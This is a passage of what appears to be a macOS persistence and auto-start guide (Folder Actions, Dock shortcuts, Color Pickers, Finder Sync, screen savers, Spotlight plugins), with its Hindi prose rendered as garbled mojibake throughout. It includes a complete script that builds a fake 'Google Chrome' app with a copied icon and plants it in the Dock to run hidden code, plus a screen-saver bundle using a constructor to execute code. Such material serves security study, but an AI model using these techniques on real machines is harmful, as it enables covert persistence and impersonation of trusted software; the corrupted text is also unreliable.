рдЕрдм, рдЪрд▓реЗрдВ рдЗрд╕ persistence рдХреЛ GUI рдПрдХреНрд╕реЗрд╕ рдХреЗ рдмрд┐рдирд╛ рддреИрдпрд╛рд░ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдВ:

1. **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** рдХреЛ `/tmp` рдореЗрдВ рдмреИрдХрдЕрдк рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреЙрдкреА рдХрд░реЗрдВ:
* `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. рдЬреЛ Folder Actions рдЖрдкрдиреЗ рдЕрднреА рд╕реЗрдЯ рдХрд┐рдП рд╣реИрдВ, рдЙрдиреНрд╣реЗрдВ **рд╣рдЯрд╛ рджреЗрдВ**:

<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

рдЕрдм рдЬрдм рд╣рдорд╛рд░реЗ рдкрд╛рд╕ рдПрдХ рдЦрд╛рд▓реА environment рд╣реИ

3. рдмреИрдХрдЕрдк рдлрд╝рд╛рдЗрд▓ рдХреЙрдкреА рдХрд░реЗрдВ: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. рдЗрд╕ рдХреЙрдиреНрдлрд╝рд┐рдЧ рдХреЛ рдЙрдкрднреЛрдХреНрддрд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП Folder Actions Setup.app рдЦреЛрд▓реЗрдВ: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

{% hint style="danger" %}
рдФрд░ рдпрд╣ рдореЗрд░реЗ рд▓рд┐рдП рдХрд╛рдо рдирд╣реАрдВ рдХрд░рд╛, рд▓реЗрдХрд┐рди рдпреЗ рд▓рд┐рдЦрдиреЗ рдХреЗ рдирд┐рд░реНрджреЗрд╢ рд╣реИрдВ:(
{% endhint %}

### Spotlight Importers

Writeup: [https://theevilbit.github.io/beyond/beyond\_0011/](https://theevilbit.github.io/beyond/beyond\_0011/)

* рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдХреЛ рдЫреЛрдбрд╝рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА: [ЁЯЯа](https://emojipedia.org/large-orange-circle)
* рд▓реЗрдХрд┐рди рдЖрдк рдПрдХ рдирдпрд╛ рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдореЗрдВ рдЖ рдЬрд╛рдПрдВрдЧреЗ

#### рд╕реНрдерд╛рди

* **`/Library/Spotlight`**&#x20;
* **`~/Library/Spotlight`**

#### рд╡рд┐рд╡рд░рдг

рдЖрдк рдПрдХ **рднрд╛рд░реА рд╕реИрдВрдбрдмреЙрдХреНрд╕** рдореЗрдВ рдЖ рдЬрд╛рдПрдВрдЧреЗ, рдЗрд╕рд▓рд┐рдП рдЖрдк рд╢рд╛рдпрдж рдЗрд╕ рддрдХрдиреАрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд░рдирд╛ рдЪрд╛рд╣реЗрдВрдЧреЗред

### Dock shortcuts

Writeup: [https://theevilbit.github.io/beyond/beyond\_0027/](https://theevilbit.github.io/beyond/beyond\_0027/)

* рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдХреЛ рдЫреЛрдбрд╝рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА: [тЬЕ](https://emojipedia.org/check-mark-button)
* рд▓реЗрдХрд┐рди рдЖрдкрдХреЛ рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рдПрдХ рдЦрддрд░рдирд╛рдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдирд╛ рд╣реЛрдЧрд╛

#### рд╕реНрдерд╛рди

* `~/Library/Preferences/com.apple.dock.plist`
* **рдЯреНрд░рд┐рдЧрд░**: рдЬрдм рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдбреЙрдХ рдореЗрдВ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░рддрд╛ рд╣реИ

#### рд╡рд┐рд╡рд░рдг рдФрд░ рд╢реЛрд╖рдг

рдбреЙрдХ рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗрдиреЗ рд╡рд╛рд▓реЗ рд╕рднреА рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдкреНрд▓рд┐рд╕реНрдЯ рдореЗрдВ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рд╣реЛрддреЗ рд╣реИрдВ: **`~/Library/Preferences/com.apple.dock.plist`**

рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рдЖрдк рдПрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдЬреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВ рдмрд╕ рдЗрд╕рдХреЗ рд╕рд╛рде:

{% code overflow="wrap" %}
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
{% endcode %}

рдХреБрдЫ **рд╕рд╛рдорд╛рдЬрд┐рдХ рдЗрдВрдЬреАрдирд┐рдпрд░рд┐рдВрдЧ** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк рдбреЙрдХ рдХреЗ рдЕрдВрджрд░ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП Google Chrome рдХреА рдЕрдиреБрдХрд░рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдЕрдкрдиреА рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### рдХрд▓рд░ рдкрд┐рдХрд░реНрд╕

рд▓реЗрдЦ: [https://theevilbit.github.io/beyond/beyond\_0017](https://theevilbit.github.io/beyond/beyond\_0017/)

* рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдХреЛ рдЫрд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА: [ЁЯЯа](https://emojipedia.org/large-orange-circle)
* рдПрдХ рдмрд╣реБрдд рд╡рд┐рд╢рд┐рд╖реНрдЯ рдХрд╛рд░реНрд░рд╡рд╛рдИ рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдП
* рдЖрдк рдПрдХ рдФрд░ рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдореЗрдВ рд╕рдорд╛рдкреНрдд рд╣реЛ рдЬрд╛рдПрдВрдЧреЗ

#### рд╕реНрдерд╛рди

* `/Library/ColorPickers`&#x20;
* рд░реВрдЯ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ
* рдЯреНрд░рд┐рдЧрд░: рдХрд▓рд░ рдкрд┐рдХрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ
* `~/Library/ColorPickers`
* рдЯреНрд░рд┐рдЧрд░: рдХрд▓рд░ рдкрд┐рдХрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ

#### рд╡рд┐рд╡рд░рдг рдФрд░ рдЙрддреНрдкрд╛рджрди

рдЕрдкрдиреЗ рдХреЛрдб рдХреЗ рд╕рд╛рде рдПрдХ рдХрд▓рд░ рдкрд┐рдХрд░ рдмрдВрдбрд▓ рдХреЛ рдХрдВрдкрд╛рдЗрд▓ рдХрд░реЗрдВ (рдЖрдк [**рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП**](https://github.com/viktorstrate/color-picker-plus)) рдФрд░ рдПрдХ constructor рдЬреЛрдбрд╝реЗрдВ (рдЬреИрд╕реЗ [рд╕реНрдХреНрд░реАрди рд╕реЗрд╡рд░ рдЦрдВрдб](macos-auto-start-locations.md#screen-saver) рдореЗрдВ) рдФрд░ рдмрдВрдбрд▓ рдХреЛ `~/Library/ColorPickers` рдореЗрдВ рдХреЙрдкреА рдХрд░реЗрдВред

рдлрд┐рд░, рдЬрдм рдХрд▓рд░ рдкрд┐рдХрд░ рдЯреНрд░рд┐рдЧрд░ рд╣реЛрддрд╛ рд╣реИ, рдЖрдкрдХрд╛ рдХреЛрдб рднреА рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЖрдкрдХреА рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рд╡рд╛рд▓рд╛ рдмрд╛рдЗрдирд░реА рдПрдХ **рдмрд╣реБрдд рд╕реАрдорд┐рдд рд╕реИрдВрдбрдмреЙрдХреНрд╕** рд╣реИ: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`

{% code overflow="wrap" %}
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
{% endcode %}

### рдлрд╝рд╛рдЗрдВрдбрд░ рд╕рд┐рдВрдХ рдкреНрд▓рдЧрдЗрдиреНрд╕

**рд▓реЗрдЦ**: [https://theevilbit.github.io/beyond/beyond\_0026/](https://theevilbit.github.io/beyond/beyond\_0026/)\
**рд▓реЗрдЦ**: [https://objective-see.org/blog/blog\_0x11.html](https://objective-see.org/blog/blog\_0x11.html)

* рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдХреЛ рджреМрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА: **рдирд╣реАрдВ, рдХреНрдпреЛрдВрдХрд┐ рдЖрдкрдХреЛ рдЕрдкрдирд╛ рдЦреБрдж рдХрд╛ рдРрдкреНрд▓рд┐рдХреЗрд╢рди рдЪрд▓рд╛рдирд╛ рд╣реЛрдЧрд╛**

#### рд╕реНрдерд╛рди

* рдПрдХ рд╡рд┐рд╢реЗрд╖ рдРрдк

#### рд╡рд┐рд╡рд░рдг рдФрд░ рдЙрддреНрдкрд╛рджрди

рдлрд╝рд╛рдЗрдВрдбрд░ рд╕рд┐рдВрдХ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреЗ рд╕рд╛рде рдПрдХ рдРрдкреНрд▓рд┐рдХреЗрд╢рди рдЙрджрд╛рд╣рд░рдг [**рдпрд╣рд╛рдВ рдкрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ**](https://github.com/D00MFist/InSync).

рдРрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ `рдлрд╝рд╛рдЗрдВрдбрд░ рд╕рд┐рдВрдХ рдПрдХреНрд╕рдЯреЗрдВрд╢рди` рд╣реЛ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдПрдХ рдРрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рдЕрдВрджрд░ рдЬрд╛рдПрдЧрд╛ рдЬреЛ рдЪрд▓рд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛ред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреЛ рдЕрдкрдиреА рдХреЛрдб рдХреЛ рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП **рдХрд┐рд╕реА рд╡реИрдз Apple рдбреЗрд╡рд▓рдкрд░ рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдХреЗ рд╕рд╛рде рд╕рд╛рдЗрди рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП**, рдЗрд╕реЗ **рд╕реИрдВрдбрдмреЙрдХреНрд╕** рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП (рд╣рд╛рд▓рд╛рдВрдХрд┐ рдвреАрд▓реА рдЫреВрдЯреЗрдВ рдЬреЛрдбрд╝реА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВ) рдФрд░ рдЗрд╕реЗ рдХреБрдЫ рдЗрд╕ рддрд░рд╣ рд╕реЗ рдкрдВрдЬреАрдХреГрдд рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП:
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### рд╕реНрдХреНрд░реАрди рд╕реЗрд╡рд░

рд▓реЗрдЦ: [https://theevilbit.github.io/beyond/beyond\_0016/](https://theevilbit.github.io/beyond/beyond\_0016/)\
рд▓реЗрдЦ: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)

* рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдХреЛ рдЫрд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА: [ЁЯЯа](https://emojipedia.org/large-orange-circle)
* рд▓реЗрдХрд┐рди рдЖрдк рдПрдХ рд╕рд╛рдорд╛рдиреНрдп рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдореЗрдВ рдЕрдВрдд рдореЗрдВ рдкрд╣реБрдВрдЪреЗрдВрдЧреЗ

#### рд╕реНрдерд╛рди

* `/System/Library/Screen Savers`&#x20;
* рд░реВрдЯ рдЕрдирд┐рд╡рд╛рд░реНрдп
* **рдЯреНрд░рд┐рдЧрд░**: рд╕реНрдХреНрд░реАрди рд╕реЗрд╡рд░ рдХрд╛ рдЪрдпрди рдХрд░реЗрдВ
* `/Library/Screen Savers`
* рд░реВрдЯ рдЕрдирд┐рд╡рд╛рд░реНрдп
* **рдЯреНрд░рд┐рдЧрд░**: рд╕реНрдХреНрд░реАрди рд╕реЗрд╡рд░ рдХрд╛ рдЪрдпрди рдХрд░реЗрдВ
* `~/Library/Screen Savers`
* **рдЯреНрд░рд┐рдЧрд░**: рд╕реНрдХреНрд░реАрди рд╕реЗрд╡рд░ рдХрд╛ рдЪрдпрди рдХрд░реЗрдВ

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1).png" alt="" width="375"><figcaption></figcaption></figure>

#### рд╡рд┐рд╡рд░рдг рдФрд░ рд╢реЛрд╖рдг

Xcode рдореЗрдВ рдПрдХ рдирдпрд╛ рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдмрдирд╛рдПрдВ рдФрд░ рдПрдХ рдирдпрд╛ **рд╕реНрдХреНрд░реАрди рд╕реЗрд╡рд░** рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЯреЗрдореНрдкрд▓реЗрдЯ рдХрд╛ рдЪрдпрди рдХрд░реЗрдВред рдлрд┐рд░, рдЗрд╕реЗ рдЕрдкрдиреЗ рдХреЛрдб рдореЗрдВ рд╢рд╛рдорд┐рд▓ рдХрд░реЗрдВ, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛрдб рддрд╛рдХрд┐ рд▓реЙрдЧ рдЙрддреНрдкрдиреНрди рд╣реЛрдВред

**рдмрд┐рд▓реНрдб** рдХрд░реЗрдВ, рдФрд░ `.saver` рдмрдВрдбрд▓ рдХреЛ **`~/Library/Screen Savers`** рдореЗрдВ рдХреЙрдкреА рдХрд░реЗрдВред рдлрд┐рд░, рд╕реНрдХреНрд░реАрди рд╕реЗрд╡рд░ GUI рдЦреЛрд▓реЗрдВ рдФрд░ рдЙрд╕ рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ, рдЗрд╕рд╕реЗ рдмрд╣реБрдд рд╕рд╛рд░реЗ рд▓реЙрдЧ рдЙрддреНрдкрдиреНрди рд╣реЛрдиреЗ рдЪрд╛рд╣рд┐рдП:

{% code overflow="wrap" %}
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
{% endcode %}

{% hint style="danger" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЗрд╕ рдХреЛрдб рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдмрд╛рдЗрдирд░реА (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) рдХреА entitlements рдореЗрдВ рдЖрдк **`com.apple.security.app-sandbox`** рдЦреЛрдЬ рд╕рдХрддреЗ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рдЖрдк **рд╕рд╛рдорд╛рдиреНрдп рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдХреЗ рдЕрдВрджрд░** рд╣реЛрдВрдЧреЗред
{% endhint %}

рд╕реЗрд╡рд░ рдХреЛрдб:
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### рд╕реНрдкреЙрдЯрд▓рд╛рдЗрдЯ рдкреНрд▓рдЧрдЗрди

рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдХреЛ рдЫрд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА: [ЁЯЯа](https://emojipedia.org/large-orange-circle)

* рд▓реЗрдХрд┐рди рдЖрдк рдПрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдореЗрдВ рдЕрдВрдд рдореЗрдВ рдкрд╣реБрдВрдЪреЗрдВрдЧреЗ

#### рд╕реНрдерд╛рди

* `~/Library/Spotlight/`
* **рдЯреНрд░рд┐рдЧрд░**: рд╕реНрдкреЙрдЯрд▓рд╛рдЗрдЯ рдкреНрд▓рдЧрдЗрди рджреНрд╡рд╛рд░рд╛ рдкреНрд░рдмрдВрдзрд┐рдд рдПрдХ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рд╡рд╛рд▓реА рдирдИ рдлрд╝рд╛рдЗрд▓ рдмрдирд╛рдИ рдЬрд╛рддреА рд╣реИред
* `/Library/Spotlight/`
* **рдЯреНрд░рд┐рдЧрд░**: рд╕реНрдкреЙрдЯрд▓рд╛рдЗрдЯ рдкреНрд▓рдЧрдЗрди рджреНрд╡рд╛рд░рд╛ рдкреНрд░рдмрдВрдзрд┐рдд рдПрдХ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рд╡рд╛рд▓реА рдирдИ рдлрд╝рд╛рдЗрд▓ рдмрдирд╛рдИ рдЬрд╛рддреА рд╣реИред
* рд░реВрдЯ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ
* `/System/Library/Spotlight/`
* **рдЯреНрд░рд┐рдЧрд░**: рд╕реНрдкреЙрдЯрд▓рд╛рдЗрдЯ рдкреНрд▓рдЧрдЗрди рджреНрд╡рд╛рд░рд╛ рдкреНрд░рдмрдВрдзрд┐рдд рдПрдХ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рд╡рд╛рд▓реА рдирдИ рдлрд╝рд╛рдЗрд▓ рдмрдирд╛рдИ рдЬрд╛рддреА рд╣реИред
* рд░реВрдЯ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ
* `Some.app/Contents/Library/Spotlight/`
* **рдЯреНрд░рд┐рдЧрд░**: рд╕реНрдкреЙрдЯрд▓рд╛рдЗрдЯ рдкреНрд▓рдЧрдЗрди рджреНрд╡рд╛рд░рд╛ рдкреНрд░рдмрдВрдзрд┐рдд рдПрдХ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рд╡рд╛рд▓реА рдирдИ рдлрд╝рд╛рдЗрд▓ рдмрдирд╛рдИ рдЬрд╛рддреА рд╣реИред
* рдирдИ рдРрдк рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ

#### рд╡рд┐рд╡рд░рдг рдФрд░ рд╢реЛрд╖рдг

рд╕реНрдкреЙрдЯрд▓рд╛рдЗрдЯ рдореИрдХрдУрдПрд╕ рдХрд╛ рдЕрдВрддрд░реНрдирд┐рд╣рд┐рдд рдЦреЛрдЬ рд╕реБрд╡рд┐рдзрд╛ рд╣реИ, рдЬрд┐рд╕рдХрд╛ рдЙрджреНрджреЗрд╢реНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдЙрдирдХреЗ рдХрдВрдкреНрдпреВрдЯрд░ рдкрд░ рдбреЗрдЯрд╛ рддрдХ рддреНрд╡рд░рд┐рдд рдФрд░ рд╡реНрдпрд╛рдкрдХ рдкрд╣реБрдВрдЪ рдкреНрд░рджрд╛рди рдХрд░рдирд╛ рд╣реИред\
рдЗрд╕ рддреНрд╡рд░рд┐рдд рдЦреЛрдЬ рдХреНрд╖рдорддрд╛ рдХреЛ рд╕реБрд╡рд┐рдзрд╛рдЬрдирдХ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП, рд╕реНрдкреЙрдЯрд▓рд╛рдЗрдЯ рдПрдХ **рдкреНрд░реЛрдкреНрд░рд╛рдЗрдЯрд░реА рдбреЗрдЯрд╛рдмреЗрд╕** рдмрдирд╛рдП рд░рдЦрддрд╛ рд╣реИ рдФрд░ рдПрдХ рдЗрдВрдбреЗрдХреНрд╕ рдмрдирд╛рддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ **рдЕрдзрд┐рдХрд╛рдВрд╢ рдлрд╝рд╛рдЗрд▓реЗрдВ рдкрд╛рд░реНрд╕ рдХреА рдЬрд╛рддреА рд╣реИрдВ**, рдЬрд┐рд╕рд╕реЗ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЗ рдирд╛рдо рдФрд░ рдЙрдирдХреА рд╕рд╛рдордЧреНрд░реА рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рддреНрд╡рд░рд┐рдд рдЦреЛрдЬ рдХреА рдЬрд╛ рд╕рдХреЗред

рд╕реНрдкреЙрдЯрд▓рд╛рдЗрдЯ рдХреА рдЖрдзрд╛рд░рднреВрдд рдпрд╛рдВрддреНрд░рд┐рдХреА рдореЗрдВ 'mds' рдирд╛рдордХ рдПрдХ рдХреЗрдВрджреНрд░реАрдп рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╣реЛрддреА рд╣реИ, рдЬрд┐рд╕реЗ 'рдореЗрдЯрд╛рдбреЗрдЯрд╛ рд╕рд░реНрд╡рд░' рдХреЗ рд▓рд┐рдП рдЦрдбрд╝рд╛ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред рдпрд╣ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╕рдВрдкреВрд░реНрдг рд╕реНрдкреЙрдЯрд▓рд╛рдЗрдЯ рд╕реЗрд╡рд╛ рдХреЛ рд╕рдВрдЪрд╛рд▓рд┐рдд рдХрд░рддреА рд╣реИред рдЗрд╕рдХреЗ рд╕рд╛рде, рдХрдИ 'mdworker' рдбреЗрдорди рд╣реЛрддреЗ рд╣реИрдВ рдЬреЛ рд╡рд┐рднрд┐рдиреНрди рд░рдЦрд░рдЦрд╛рд╡ рдХрд╛рд░реНрдпреЛрдВ рдХреЛ рдХрд░рддреЗ рд╣реИрдВ, рдЬреИрд╕реЗ рдХрд┐ рд╡рд┐рднрд┐рдиреНрди рдлрд╝рд╛рдЗрд▓ рдкреНрд░рдХрд╛рд░реЛрдВ рдХреЛ рдЗрдВрдбреЗрдХреНрд╕ рдХрд░рдирд╛ (`ps -ef | grep mdworker`)ред рдпреЗ рдХрд╛рд░реНрдп рд╕рдВрднрд╡ рд╣реЛрддреЗ рд╣реИрдВ рд╕реНрдкреЙрдЯрд▓рд╛рдЗрдЯ рдЗрдВрдкреЛрд░реНрдЯрд░ рдкреНрд▓рдЧрдЗрди рдпрд╛ **".mdimporter рдмрдВрдбрд▓"** рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ, рдЬреЛ рд╕реНрдкреЙрдЯрд▓рд╛рдЗрдЯ рдХреЛ рд╡рд┐рднрд┐рдиреНрди рдлрд╝рд╛рдЗрд▓ рдкреНрд░рд╛рд░реВрдкреЛрдВ рдХреА рд╕рд╛рдордЧреНрд░реА рдХреЛ рд╕рдордЭрдиреЗ рдФрд░ рдЗрдВрдбреЗрдХреНрд╕ рдХрд░рдиреЗ рдХреА рд╕реБрд╡рд┐рдзрд╛ рдкреНрд░рджрд╛рди рдХрд░рддреЗ рд╣реИрдВред

